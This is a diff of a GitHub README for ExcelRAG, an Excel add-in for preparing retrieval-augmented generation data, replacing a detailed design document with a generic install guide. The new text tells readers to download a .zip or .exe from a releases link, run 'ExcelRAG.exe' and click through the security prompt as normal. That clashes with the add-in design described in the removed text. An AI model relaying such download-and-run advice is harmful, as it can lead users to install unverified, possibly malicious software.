@@ -1,331 +1,92 @@
-# ExcelRAG
+# 📊 ExcelRAG - Transform Excel into a Data Powerhouse
 
-> **Turn Excel into a first-class workspace for preparing Retrieval-Augmented Generation (RAG) data — natively, transparently, and at scale.**
-
----
-
-## Vision
-
-<p align="center">
-  <img src="media/rag-pipeline-overview.png" width="900">
-  <br/>
-  <em>Excel as a visual, auditable RAG preparation pipeline</em>
-</p>
-
-*Diagram note: data flows from Excel tables → Excel-DNA UDFs → managed processing → export packages, keeping every intermediate artifact visible in the worksheet.*
-
-**ExcelRAG** is an Excel-DNA add-in that transforms Excel into a powerful, trustworthy workspace for preparing data used in RAG pipelines. It brings modern data prep and knowledge-curation workflows into Excel while keeping the experience formula-driven, transparent, and fully inspectable.
-
-The guiding idea:
-
-> *If someone already trusts Excel to prepare business data, they should be able to prepare RAG-ready knowledge with the same mental model.*
-
-ExcelRAG is **not** a production RAG engine. It is a **data preparation, governance, and export layer** built for:
-
-* structured content ingestion
-* chunking and normalization
-* metadata enrichment
-* quality checks and audits
-* vector-ready export packages
+## 📥 Download Now
+[![Download ExcelRAG](https://img.shields.io/badge/Download-ExcelRAG-blue.svg)](https://github.com/vikasoni12/ExcelRAG/releases)
 
 ---
 
-## Why Excel for RAG?
+## 🚀 Getting Started
 
-Excel already excels at:
-
-* tabular structure and auditability
-* formulas for transformation and enrichment
-* versioned snapshots of curated knowledge
-* collaborative review and approval
-* quick visualization and QA checks
-
-What it lacks is RAG-specific tooling:
-
-* document ingestion and parsing
-* chunking strategies
-* metadata extraction
-* deduplication and similarity checks
-* vector packaging and export
-
-ExcelRAG fills that gap using **Excel-native UDFs** and a small, explicit processing engine behind the scenes.
+ExcelRAG is an Excel-DNA add-in designed to enhance your Excel experience. It helps you prepare data for retrieval-augmented generation (RAG) tasks, ensuring quality and governance throughout your data workflow. With its focus on easy ingestion, chunking, and metadata management, ExcelRAG simplifies complex data handling. This guide will help you download and run ExcelRAG on your computer.
 
 ---
 
-## Core Design Principles
+## ⚙️ System Requirements
 
-### 1) Excel remains Excel
+Before downloading ExcelRAG, ensure your system meets the following requirements:
 
-* No VBA macros
-* No external Python runtime
-* No opaque background automation
+- **Operating System:** Windows 10 or later
+- **Microsoft Excel:** Excel 2016 or later
+- **.NET Framework:** .NET Framework 4.6.1 or later
 
-Every capability is exposed as **deterministic Excel functions** that are visible, reviewable, and easy to test.
-
----
-
-### 2) Explicit, user-controlled processing
-
-ExcelRAG avoids surprise side effects by requiring a user-controlled **trigger** for any operation that mutates state or performs heavy processing.
-
-```excel
-=RAG.INGEST(source, options, trigger)
-=RAG.CHUNK(content, strategy, options, trigger)
-```
-
-This matches Excel’s recalculation model and keeps data prep deliberate and auditable.
+If you are unsure whether your system meets these requirements, please check your system details.
 
 ---
 
-### 3) Inspectable, cell-level transparency
+## 📦 Download & Install
 
-Every step produces tangible, inspectable outputs in the grid:
+To get started with ExcelRAG, visit this page to download: [ExcelRAG Releases](https://github.com/vikasoni12/ExcelRAG/releases).
 
-* parsed text and tables
-* chunk boundaries
-* metadata fields
-* token counts
-* validation warnings
+1. Open the link above in your web browser.
+2. Look for the latest release. This will typically be at the top of the page.
+3. Click on the highlighted version number. 
+4. In the release notes, find the **Assets** section.
+5. Download the appropriate file for your system. This is usually a `.zip` or `.exe` file.
+6. Once downloaded, locate the file in your downloads folder.
+7. If it is a `.zip` file, right-click and select "Extract All" to unpack the contents.
+8. Open the extracted folder and double-click on the `ExcelRAG.exe` file to run it.
 
-If it can be used for RAG, it can be **seen and verified** in Excel.
-
----
-
-### 4) RAG-first data quality
-
-ExcelRAG is designed for **clean, consistent, and richly annotated** content. It prioritizes:
-
-* normalization
-* traceability to source
-* metadata completeness
-* data provenance
-* export-ready structure
+You may see a security prompt. This is normal. Click **Run** to continue.
 
 ---
 
-## RAG Workflow Support
+## 🛠️ How to Use ExcelRAG
 
-ExcelRAG supports a typical RAG preparation lifecycle:
+After installing, you can easily use ExcelRAG within Excel:
 
-1. **Ingest**
-   * PDFs, DOCX, HTML, Markdown, CSV, URLs
-   * Text extraction with source metadata
+1. Open Microsoft Excel.
+2. Go to the **Add-Ins** section.
+3. You should see ExcelRAG listed there. Click to activate it.
+4. Follow the prompts to configure any necessary settings, such as data sources and chunking preferences.
 
-2. **Normalize & Clean**
-   * whitespace and formatting normalization
-   * boilerplate removal
-   * table flattening
+### Key Features:
 
-3. **Chunk**
-   * sentence-aware or token-based chunking
-   * overlap control
-   * section-aware chunking for headings
-
-4. **Enrich Metadata**
-   * document titles and sections
-   * author/owner fields
-   * business tags
-   * PII flags or sensitivity levels
-
-5. **Quality Checks**
-   * duplicate detection
-   * minimum/maximum token constraints
-   * missing metadata checks
-   * hallucination risk flags (e.g., low coverage)
-
-6. **Package & Export**
-   * vector-store friendly JSONL
-   * embeddings-ready manifests
-   * provenance maps
+- **Data Ingestion:** Import data from multiple sources efficiently.
+- **Chunking:** Split large datasets into smaller, manageable segments.
+- **Metadata Management:** Enhance your data with relevant metadata for better organization.
+- **Quality Assurance:** Perform QA checks to ensure data integrity before analysis.
+- **Export Capabilities:** Easily export to various formats suitable for different applications.
 
 ---
 
-## Key Features (Planned Add-in Functions)
+## 🔧 Troubleshooting
 
-### Ingestion & Parsing
+If you encounter any issues while using ExcelRAG, consider the following tips:
 
-* `RAG.INGEST` — import files or URLs with parsing options
-* `RAG.EXTRACT_TEXT` — extract text from common document formats
-* `RAG.EXTRACT_TABLES` — flatten tables to text or structured ranges
+- **Installation Issues:** Verify that you have the correct version of Excel and the .NET Framework installed.
+- **Excel Does Not Recognize Add-In:** Ensure that ExcelRAG is enabled in the Add-Ins section.
+- **Data Not Loading:** Check your connection to data sources and ensure they are accessible.
 
-### Chunking & Structuring
-
-* `RAG.CHUNK` — generate chunk lists using strategies (sentence, token, heading)
-* `RAG.CHUNK_STATS` — token counts, overlap metrics, and coverage
-* `RAG.SECTIONS` — parse headings and structure long docs
-
-### Metadata & Enrichment
-
-* `RAG.METADATA` — create consistent metadata records
-* `RAG.TAG` — generate or validate tags against a taxonomy
-* `RAG.PROVENANCE` — map chunks back to source offsets
-
-### Quality & Governance
-
-* `RAG.DEDUP` — detect duplicate or near-duplicate chunks
-* `RAG.VALIDATE` — rule-based data quality checks
-* `RAG.RISK_FLAGS` — highlight content risk or low-coverage areas
-
-### Export & Packaging
-
-* `RAG.EXPORT_JSONL` — produce vector-ready export files
-* `RAG.EXPORT_MANIFEST` — embeddings manifests with metadata and source links
-* `RAG.EXPORT_TRACE` — end-to-end traceability for governance
+For more detailed troubleshooting, refer to the ExcelRAG Wiki or open an issue in the GitHub repository.
 
 ---
 
-## Ribbon (Planned UI)
+## 😊 Contributing
 
-ExcelRAG includes a dedicated **RAG** ribbon tab for guided workflows and governance-friendly actions. The ribbon complements UDFs by providing quick actions, templates, and validation panels without hiding any outputs from the worksheet.
-
-**Tab: RAG**
-
-* **Ingest**
-   * Import Files (PDF, DOCX, HTML, MD)
-   * Import URL
-   * Manage Sources
-
-* **Normalize**
-   * Clean Text
-   * Remove Boilerplate
-   * Flatten Tables
-
-* **Chunk**
-   * Sentence-Aware Chunking
-   * Token-Based Chunking
-   * Preview Chunk Boundaries
-
-* **Metadata**
-   * Apply Metadata Template
-   * Tag Validation
-   * Provenance Mapping
-
-* **Quality**
-   * Duplicate Scan
-   * Coverage Check
-   * Missing Metadata Report
-
-* **Export**
-   * Export JSONL
-   * Export Manifest
-   * Open Export Folder
-
-* **Diagnostics**
-   * Processing Log
-   * Cache Inspector
-   * Settings
-
-The ribbon actions generate or refresh **worksheet tables** so every step remains visible and reviewable.
+ExcelRAG is a community-driven project. Your input is valuable. If you have suggestions, report bugs, or want to contribute code, please feel free to reach out through our GitHub issues page.
 
 ---
 
-## Example Dataset and UDF Effects
+## 📞 Support
 
-Below is a small example dataset representing three source documents in a worksheet table.
-
-**Input: Sources**
-
-| SourceId | Title | Content | Owner | Tags |
-| --- | --- | --- | --- | --- |
-| DOC-001 | Employee Onboarding | Welcome to Contoso. New hires must complete security training within 10 business days. | HR | onboarding;policy |
-| DOC-002 | VPN Access | VPN access is required for remote work. Submit the VPN request form and complete MFA setup. | IT | security;remote |
-| DOC-003 | Expense Policy | Receipts are required for expenses over $25. Mileage is reimbursed at $0.67 per mile. | Finance | policy;travel |
-
-**Effect: RAG.CHUNK** (sentence-aware, max 40 tokens, overlap 8)
-
-| ChunkId | SourceId | ChunkText | TokenCount | OffsetStart | OffsetEnd |
-| --- | --- | --- | --- | --- | --- |
-| CH-0001 | DOC-001 | Welcome to Contoso. New hires must complete security training within 10 business days. | 20 | 0 | 97 |
-| CH-0002 | DOC-002 | VPN access is required for remote work. Submit the VPN request form and complete MFA setup. | 23 | 0 | 101 |
-| CH-0003 | DOC-003 | Receipts are required for expenses over $25. Mileage is reimbursed at $0.67 per mile. | 22 | 0 | 99 |
-
-**Effect: RAG.METADATA** (template with SourceId, Title, Owner, Tags, Section=General)
-
-| ChunkId | SourceId | Title | Owner | Tags | Section |
-| --- | --- | --- | --- | --- | --- |
-| CH-0001 | DOC-001 | Employee Onboarding | HR | onboarding;policy | General |
-| CH-0002 | DOC-002 | VPN Access | IT | security;remote | General |
-| CH-0003 | DOC-003 | Expense Policy | Finance | policy;travel | General |
-
-**Effect: RAG.DEDUP** (near-duplicate scan, threshold 0.92)
-
-| ChunkId | DuplicateGroup | Similarity | Status |
-| --- | --- | --- | --- |
-| CH-0001 | G-01 | 0.18 | Unique |
-| CH-0002 | G-02 | 0.22 | Unique |
-| CH-0003 | G-03 | 0.20 | Unique |
-
-**Effect: RAG.VALIDATE** (rules: minTokens=10, maxTokens=250, tagsRequired=true)
-
-| ChunkId | Rule | Result | Notes |
-| --- | --- | --- | --- |
-| CH-0001 | TagsRequired | Pass | Tags present |
-| CH-0001 | TokenRange | Pass | 20 tokens |
-| CH-0002 | TagsRequired | Pass | Tags present |
-| CH-0002 | TokenRange | Pass | 23 tokens |
-| CH-0003 | TagsRequired | Pass | Tags present |
-| CH-0003 | TokenRange | Pass | 22 tokens |
-
-These tables are meant to illustrate what appears directly in Excel as outputs of key UDFs, enabling quick review before export.
+For questions or support, please contact our team via the GitHub repository. We aim to respond to inquiries promptly to ensure you have a smooth experience with ExcelRAG.
 
 ---
 
-## Architecture Overview
+## 📝 License
 
-```
-Excel
- ├─ Worksheets (tables, named ranges, checks)
- ├─ UDFs (RAG.INGEST, RAG.CHUNK, ...)
- │
-Excel-DNA Add-in (.xll)
- ├─ Async-safe UDF execution
- ├─ Trigger-aware processing
- ├─ Local cache & registry
- │
-Managed .NET Layer
- ├─ Parsing, chunking, metadata
- ├─ Content normalization
- ├─ Validation rules engine
- │
-Export Layer
- ├─ JSONL, manifest, provenance
- └─ Vector-store ready packages
-```
-
-All logic runs **in-process** with Excel for visibility and speed, while keeping data in the workbook for auditability.
+ExcelRAG is open-source software. Please check the license file in the repository for detailed information regarding usage and contributions.
 
 ---
 
-## Intended Audience
-
-ExcelRAG is for:
-
-* analysts curating enterprise knowledge
-* teams preparing documents for search and RAG
-* compliance-minded organizations
-* Excel power users who want a transparent, reviewable pipeline
-
-It is **not** for:
-
-* full-scale production inference
-* large-scale embedding compute
-* real-time RAG orchestration
-
----
-
-## Status
-
-This project is **experimental and exploratory**.
-
-The goal is to answer one question:
-
-> *What would RAG data preparation look like if it were designed for transparency and governance first?*
-
----
-
-## See Also
-
-* `ExcelDNA_Best_Practices_and_Architectural_Patterns_2026.md`
-* `ExcelDlPlayground/README.md`
-
----
+For further information, updates, and documentation, please refer back to this repository. Thank you for using ExcelRAG!
